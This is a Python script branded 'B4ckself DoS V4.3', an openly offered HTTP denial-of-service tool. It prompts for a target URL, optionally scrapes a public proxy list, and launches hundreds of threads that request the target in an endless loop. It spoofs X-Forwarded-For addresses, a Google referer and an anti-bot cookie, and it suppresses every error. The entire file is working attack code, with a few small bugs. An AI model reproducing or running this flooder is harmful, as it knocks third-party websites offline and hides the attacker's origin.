import urllib.request, os, threading, time, random, sys, random, string

class Spammer(threading.Thread):
    
    def __init__(self, url, number, lista):
        threading.Thread.__init__(self)
        self.url = url
        self.num = number
        self.data = None
        self.chars = [", 94.10.0.0",", 178.32.0.52", ", 73.32.52.123", ", 127.0.0.1", ", 192.168.1.254",
                 ", 94.23.50.21", ", 45.23.542.1", ", 190.12.42.12", ", 95.65.243.12", ", 65.23.271.12"]
        self.headers = { 'Cookie' : 'notabot=1',
                         'Accept-Encoding' : 'gzip,deflate',
                         'Connection' : 'Keep-alive',
                         'Accept': '*/*',
                         'Host' : 'www.google.it',
			 'X-Forwarded-For' : ''.join(random.choice(self.chars) for x in range(6)),
			 'Referer' : 'google.it',
                         'Via' : 'wwww.google.it',
                         'User-Agent' : 'Mozilla/5.0 Firefox/3.5.6 Tapatalk/1.0' }
        self.Lock = threading.Lock()
        self.lista = lista

    def request_proxy(self):
        global N
        if N >= (len(self.lista) - 1):
            N = 0
        proxy = urllib.request.ProxyHandler({'http': self.lista[N]})
        opener = urllib.request.build_opener(proxy)
        urllib.request.install_opener(opener) 
        req = urllib.request.Request(self.url, self.data, self.headers)
        urllib.request.urlopen(req)
        sys.stdout.write("Thread #%4d | %4d\%d | Proxy %s" % (self.num, N, len(self.lista), self.lista[N]))

    def request_default(self):
        req = urllib.request.Request(self.url, self.data, {'User-Agent' : 'Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)'})
        response = urllib.request.urlopen(req)
        print ("Thread #%4d | 192.168.1.1 @ %s" % (self.num, self.url))
        
    def run(self):
        global N
        while True:
            try:
                if Proxy_Mode:
                    N += 1
                    self.request_proxy()
                else:
                    self.request_default()
            except: 
                pass
                 
class MainLoop():
    
    def __init__(self):
        if os.name in ("nt", "dos", "ce"):
            os.system('cls')
            os.system('title       ........:::::   B4ckself DoS V4.3   :::::........        Python 3.3.3')
            os.system('color a')
            color = ['a', 'b', 'c', 'd', 'e', 'f']
            os.system('color %s' % (color[random.randint(0, 5)]))
        print ('\n                     ###################################\n')
        print ('                 01010o.....::B4ckself DoS V4.3::.....o01010\n')
        print ('              #################################################')
        print ('\n\t  A DoS Concept for HTTP site, Coded by B4ckdoor & Xordas\n')
        print ('\t                ProxyHandling by Sikh887             \n\n')
    
    def check_url(self, url):
        if url[0]+url[1]+url[2]+url[3] == "www.":
            url = "http://" + url
        elif url[0]+url[1]+url[2]+url[3] == "http":
            pass
        else:
            url = "http://" + url
        return url

    def retrieve_proxy(self):
        sourcecode = urllib.request.urlopen("http://free-proxy-list.net/")
        half = str(sourcecode.read())
        half = half.split("<tbody>")
        half = half[1].split("</tbody>")
        half = half[0].split("<tr><td>")
        lista = ""
        for proxy in half:
            proxy = proxy.split("</td><td>")
            try:
                lista = lista + proxy[0] + ":" + proxy[1] + "\n"
            except:
                pass
        out_file = open("proxy.txt","w")
        out_file.write(lista)
        out_file.close()

    def setup(self):
        global Proxy_Mode
        while True:
            try:
                url = input('> Enter Url to DoS: ')
                url = self.check_url(url)
                req = urllib.request.Request(url, None, {'User-Agent' : 'Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)'})
                response = urllib.request.urlopen(req)
                break
            except:                
                print ('> Could not open specified url.')
        while True:
            try:
                o = input('> Enter [y] to enable ProxyMode or press [Enter] to enable NoProxyMode: ')
                if o == 'y':
                    Proxy_Mode = True
                    break
                else:
                    Proxy_Mode = False
                    lista = False
                    break
            except:
                pass
        if Proxy_Mode:
            while True:
                try:                
                    s = str(input("> Enter [y] to download a fresh proxy list or [Enter] to skip: "))
                    if s == "y":
                        self.retrieve_proxy()
                        print("> Proxy list successfully downloaded.")
                        break
                    else:
                        break
                except:
                    print ('> Failed to download the proxy list.')
            while True:            
                try:
                    l = str(input('> Enter the proxy list: '))
                    in_file = open(l,"r")
                    lista = []
                    for i in in_file:
                        lista.append(i.split("/n")[0])
                    break
                except:
                    print ('Error to read file.')         
        while True:                
            try:
                num_threads = int(input('> Enter the number of thread [800]: '))
            except:
                num_threads = 800
            break

        print ("-----------------------------------------------------------\n   Target:\t%s\n   ProxyBomber:\t%s\n   Thread:\t%d\n-----------------------------------------------------------\n> Starting...\n" % (url, Proxy_Mode, num_threads))
        time.sleep(3)
        for i in range(num_threads):
            Spammer(url, i + 1, lista).start()
        
if __name__ == '__main__':
    N = 0
    b = MainLoop()
    b.setup()
